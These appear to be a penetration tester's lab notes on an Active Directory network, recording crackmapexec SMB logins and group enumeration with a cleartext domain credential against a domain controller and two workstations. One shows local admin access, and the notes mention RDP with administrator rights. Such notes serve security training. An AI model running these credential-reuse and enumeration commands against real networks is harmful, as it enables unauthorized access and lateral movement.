# 10.0.0.225
![[Pasted image 20250715185313.png]]
![[Pasted image 20250715185338.png]]

crackmapexec smb 10.0.0.225 -u fservice -p football1* --groups
SMB         10.0.0.225      445    AFCR-DC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:AFCR-DC) (domain:AFC-RICHMOND.local) (signing:True) (SMBv1:False)
SMB         10.0.0.225      445    AFCR-DC          [+] AFC-RICHMOND.local\fservice:football1* 
SMB         10.0.0.225      445    AFCR-DC          [+] Enumerated domain group(s)
SMB         10.0.0.225      445    AFCR-DC          DnsUpdateProxy                           membercount: 0
SMB         10.0.0.225      445    AFCR-DC          DnsAdmins                                membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Enterprise Key Admins                    membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Key Admins                               membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Protected Users                          membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Cloneable Domain Controllers             membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Enterprise Read-only Domain Controllers  membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Read-only Domain Controllers             membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Denied RODC Password Replication Group   membercount: 8
SMB         10.0.0.225      445    AFCR-DC          Allowed RODC Password Replication Group  membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Terminal Server License Servers          membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Windows Authorization Access Group       membercount: 1
SMB         10.0.0.225      445    AFCR-DC          Incoming Forest Trust Builders           membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Pre-Windows 2000 Compatible Access       membercount: 1
SMB         10.0.0.225      445    AFCR-DC          Account Operators                        membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Server Operators                         membercount: 0
SMB         10.0.0.225      445    AFCR-DC          RAS and IAS Servers                      membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Group Policy Creator Owners              membercount: 1
SMB         10.0.0.225      445    AFCR-DC          Domain Guests                            membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Domain Users                             membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Domain Admins                            membercount: 1
SMB         10.0.0.225      445    AFCR-DC          Cert Publishers                          membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Enterprise Admins                        membercount: 1
SMB         10.0.0.225      445    AFCR-DC          Schema Admins                            membercount: 1
SMB         10.0.0.225      445    AFCR-DC          Domain Controllers                       membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Domain Computers                         membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Storage Replica Administrators           membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Remote Management Users                  membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Access Control Assistance Operators      membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Hyper-V Administrators                   membercount: 0
SMB         10.0.0.225      445    AFCR-DC          RDS Management Servers                   membercount: 0
SMB         10.0.0.225      445    AFCR-DC          RDS Endpoint Servers                     membercount: 0
SMB         10.0.0.225      445    AFCR-DC          RDS Remote Access Servers                membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Certificate Service DCOM Access          membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Event Log Readers                        membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Cryptographic Operators                  membercount: 0
SMB         10.0.0.225      445    AFCR-DC          IIS_IUSRS                                membercount: 1
SMB         10.0.0.225      445    AFCR-DC          Distributed COM Users                    membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Performance Log Users                    membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Performance Monitor Users                membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Network Configuration Operators          membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Remote Desktop Users                     membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Replicator                               membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Backup Operators                         membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Print Operators                          membercount: 0
SMB         10.0.0.225      445    AFCR-DC          Guests                                   membercount: 2
SMB         10.0.0.225      445    AFCR-DC          Users                                    membercount: 3
SMB         10.0.0.225      445    AFCR-DC          Administrators                           membercount: 3

# 10.0.0.25
![[Pasted image 20250715185147.png]]

So we rdp into this and get administrator prev.

![[Pasted image 20250715185530.png]]

2 amazon processes running
![[Pasted image 20250715192620.png]]
![[Pasted image 20250715193041.png]]


crackmapexec smb 10.0.0.25 -u fservice -p football1* --groups
SMB         10.0.0.25       445    AFC-WS-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:AFC-WS-1) (domain:AFC-RICHMOND.local) (signing:False) (SMBv1:False)
SMB         10.0.0.25       445    AFC-WS-1         [+] AFC-RICHMOND.local\fservice:football1* (Pwn3d!)
SMB         10.0.0.25       445    AFC-WS-1         [-] Error enumerating domain group using dc ip 10.0.0.25: socket connection error while opening: [Errno 111] Connection refused


# 10.0.0.35
![[Pasted image 20250715185606.png]]

crackmapexec smb 10.0.0.35 -u fservice -p football1* --groups
SMB         10.0.0.35       445    AFC-WS-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:AFC-WS-2) (domain:AFC-RICHMOND.local) (signing:False) (SMBv1:False)
SMB         10.0.0.35       445    AFC-WS-2         [+] AFC-RICHMOND.local\fservice:football1* 
SMB         10.0.0.35       445    AFC-WS-2         [-] Error enumerating domain group using dc ip 10.0.0.35: socket connection error while opening: [Errno 110] Connection timed out


